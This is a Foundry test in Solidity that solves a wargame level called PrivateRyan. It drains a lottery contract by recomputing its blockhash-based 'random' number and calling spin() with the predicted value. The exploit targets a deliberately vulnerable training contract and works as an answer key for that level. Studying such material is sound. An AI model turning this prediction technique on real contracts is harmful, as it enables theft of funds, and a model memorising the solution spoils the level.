// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/02_PrivateRyan/PrivateRyan.sol";

// forge test --match-contract PrivateRyanTest -vvvv
contract PrivateRyanTest is BaseTest {
    uint256 seed = 1;
    uint256 FACTOR = 1157920892373161954135709850086879078532699843656405640394575840079131296399;
    PrivateRyan instance;

    function setUp() public override {
        super.setUp();
        instance = new PrivateRyan{value: 0.01 ether}();
        seed = rand(256);
        vm.roll(48743985);
    }

    function testExploitLevel() public {
        uint256 currentBlockNumber = block.number;
        
        for (uint256 guessedSeed = 0; guessedSeed < 256; guessedSeed++) {
            uint256 trialBlockNumber = currentBlockNumber - guessedSeed;
            uint256 hashVal = uint256(blockhash(trialBlockNumber));
            uint256 factor = (FACTOR * 100) / 100;
            uint256 num = uint256((uint256(hashVal) / factor)) % 100;
            
            if (num == rand(100)) {
                instance.spin{value: 0.01 ether}(num);
                break;
            }
        }

        checkSuccess();
    }

    function rand(uint256 max) internal view returns (uint256 result) {
        uint256 factor = (FACTOR * 100) / max;
        uint256 blockNumber = block.number - seed;
        uint256 hashVal = uint256(blockhash(blockNumber));

        return uint256((uint256(hashVal) / factor)) % max;
    }

    function checkSuccess() internal view override {
        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
    }
}
